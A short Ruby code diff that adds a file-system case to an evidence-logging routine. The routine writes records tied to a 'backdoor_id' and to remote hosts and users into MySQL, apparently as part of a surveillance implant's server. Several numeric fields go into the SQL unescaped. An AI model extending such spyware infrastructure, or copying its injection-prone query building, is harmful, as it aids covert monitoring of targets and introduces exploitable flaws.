@@ -273,6 +273,21 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                  '#{@mysql.escape(evidence.info[:location])}',
                  '#{@mysql.escape(evidence.info[:source])}')"
+      when :FILESYSTEM
+        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, `varchar1`, `int1`, `int2`, `int3`)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:path])}',
+                 #{evidence.info[:size_hi]},
+                 #{evidence.info[:size_lo]},
+                 #{evidence.info[:attribute]})"
       else
         trace :debug, "Not implemented."
         return nil
